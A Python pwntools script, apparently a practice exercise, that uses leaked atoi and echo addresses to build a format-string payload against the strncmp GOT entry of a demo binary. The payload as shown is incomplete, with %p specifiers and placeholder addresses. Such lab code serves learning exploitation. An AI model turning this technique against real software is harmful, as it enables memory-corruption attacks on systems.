from pwn import *

def get_len(c: int, written: int) -> int:
    res = c - written
    if res < 0:
        res += 0x100

    return res

#p = process(["/media/shared/shared/qemu-9.1.0/buildUbuntu/qemu-x86_64", "-g", "1234", "./libc_demo"])
p = process(["./libc_demo"])

elf = ELF("./libc_demo")

libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

p.recvuntil(b"atoi: ")
atoi_leak = int(p.recvuntil(b"\n", drop=True), 16)

p.recvuntil(b"echo: ")
echo_leak = int(p.recvuntil(b"\n", drop=True), 16)

elf.address = echo_leak - elf.symbols["echo"]
libc.address = atoi_leak - libc.symbols["atoi"]


target_addr = elf.symbols["strncmp"]
print(f"target addr: {hex(target_addr)}")

print(f"old value: {hex(libc.symbols['strncmp'])}")
print(f"new value: {hex(libc.symbols['atoi'])}")


new_bytes = p64(libc.symbols["atoi"])[0:3]

payload = b""


written = 0

for i in range(0, 3):
    to_write = get_len(new_bytes[i], written)
    written = (written + to_write) % 0x100


    payload += f"%{to_write}c%{28 + i}$p".encode()


payload = payload.ljust(80)

for i in range(0, 3):
    payload += b"AAAAAAAA" #p64(target_addr + i)


print(payload)

p.sendline(payload)
p.interactive()